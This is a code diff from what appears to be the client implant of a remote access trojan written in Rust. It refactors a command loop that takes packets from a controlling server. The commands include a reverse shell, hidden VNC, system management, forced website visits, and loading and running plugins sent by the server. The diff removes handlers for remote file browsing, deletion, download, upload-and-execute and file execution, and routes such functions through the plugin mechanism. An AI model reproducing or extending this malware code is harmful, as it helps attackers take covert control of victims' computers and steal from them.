@@ -10,14 +10,13 @@ use tokio::sync::oneshot;
 use tokio::sync::mpsc;
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
-use crate::features::file_manager::FileManager;
 use crate::features::reverse_proxy::ReverseProxy;
 use common::connection::{ConnectionReader, ConnectionWriter};
 use crate::service::config::get_config;
 use crate::REVERSE_SHELL;
 use std::collections::HashMap;
 use std::sync::Arc;
-use crate::plugin_manager::plugin::Plugin;
+use crate::service::plugin::Plugin;
 
 static PACKET_SENDER: Lazy<Mutex<Option<mpsc::Sender<ServerboundPacket>>>> = Lazy::new(|| {
     Mutex::new(None)
@@ -35,7 +34,6 @@ pub async fn reading_loop(
 ) {
     let config = get_config();
     let mut reverse_proxy = ReverseProxy::new();
-    let mut file_manager = FileManager::new();
     let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
@@ -56,15 +54,29 @@ pub async fn reading_loop(
             }
 
             Ok(Some(ClientboundPacket::ExecutePlugin(plugin_name, plugin_data))) => {
-                match Plugin::new(plugin_name.clone(), plugin_data) {
-                    Ok(plugin) => {
-                        let mut map = RUNNING_PLUGINS.lock().unwrap();
-                        map.insert(plugin_name.clone(), plugin);
+                let mut plugins = RUNNING_PLUGINS.lock().unwrap();
+                if let Some(_plugin) = plugins.get(&plugin_name) {
+                    println!("Plugin '{}' already loaded", plugin_name);
+                } else {
+                    match Plugin::new(plugin_name.clone(), plugin_data) {
+                        Ok(plugin) => {
+                        plugins.insert(plugin_name.clone(), plugin);
                         println!("✅ Plugin '{}' loaded successfully!", plugin_name);
                     }
                     Err(e) => {
-                        println!("❌ Failed to load plugin '{}': {:?}", plugin_name, e);
+                            println!("❌ Failed to load plugin '{}': {:?}", plugin_name, e);
+                        }
                     }
+                }
+            }
+
+            Ok(Some(ClientboundPacket::RunPlugin(plugin_name, inner_packet))) => {
+                println!("Running plugin: {}", plugin_name);
+                println!("Inner packet: {:?}", inner_packet.get_type());
+                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get(&plugin_name) {
+                    plugin.execute(inner_packet.serialized());
+                } else {
+                    println!("⚠️ Plugin '{}' not found!", plugin_name);
                 }
             }
 
@@ -100,60 +112,6 @@ pub async fn reading_loop(
             }
 
             Ok(Some(ClientboundPacket::ManageSystem(command))) => system_commands(&command),
-
-            Ok(Some(ClientboundPacket::AvailableDisks)) => {
-                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
-                    plugin.execute(b"list_available_disks".to_vec());
-                } else {
-                    println!("⚠️ Plugin 'file_manager' not found!");
-                }
-            }
-            
-            Ok(Some(ClientboundPacket::PreviousDir)) => {
-                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
-                    plugin.execute(b"previous_dir".to_vec());
-                    plugin.execute(b"write_current_folder".to_vec());
-                } else {
-                    println!("⚠️ Plugin 'file_manager' not found!");
-                }
-            }
-            
-            Ok(Some(ClientboundPacket::ViewDir(path))) => {
-                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
-                    let cmd = format!("view_folder:{}", path);
-                    plugin.execute(cmd.into_bytes());
-                    plugin.execute(b"write_current_folder".to_vec());
-                } else {
-                    println!("⚠️ Plugin 'file_manager' not found!");
-                }
-            }
-            
-            Ok(Some(ClientboundPacket::RemoveDir(path))) => {
-                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
-                    let cmd = format!("remove_dir:{}", path);
-                    plugin.execute(cmd.into_bytes());
-                } else {
-                    println!("⚠️ Plugin 'file_manager' not found!");
-                }
-            }
-            
-            Ok(Some(ClientboundPacket::RemoveFile(path))) => {
-                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
-                    let cmd = format!("remove_file:{}", path);
-                    plugin.execute(cmd.into_bytes());
-                } else {
-                    println!("⚠️ Plugin 'file_manager' not found!");
-                }
-            }
-            
-            Ok(Some(ClientboundPacket::DownloadFile(path))) => {
-                if let Some(plugin) = RUNNING_PLUGINS.lock().unwrap().get("file_manager") {
-                    let cmd = format!("download_file:{}", path);
-                    plugin.execute(cmd.into_bytes());
-                } else {
-                    println!("⚠️ Plugin 'file_manager' not found!");
-                }
-            }
             
             Ok(Some(ClientboundPacket::VisitWebsite(visit_data))) => visit_website(&visit_data),
 
@@ -189,12 +147,6 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
             
             Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe"),
-            
-            Ok(Some(ClientboundPacket::UploadAndExecute(file_data))) => file_manager.upload_and_execute(file_data).await,
-            
-            Ok(Some(ClientboundPacket::ExecuteFile(path))) => file_manager.execute_file(&path).await,
-            
-            Ok(Some(ClientboundPacket::UploadFile(target_folder, file_data))) => file_manager.upload_file(target_folder, file_data).await,
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
